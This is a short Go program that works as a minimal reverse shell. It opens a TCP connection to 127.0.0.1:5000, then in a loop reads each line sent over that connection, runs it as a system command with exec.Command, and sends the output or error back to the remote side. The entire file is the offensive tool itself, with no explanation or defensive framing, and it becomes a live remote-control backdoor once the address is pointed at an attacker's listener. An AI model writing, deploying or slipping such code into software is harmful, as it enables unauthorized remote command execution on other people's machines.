package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, _ := net.Dial("tcp", "127.0.0.1:5000")
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')

		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}
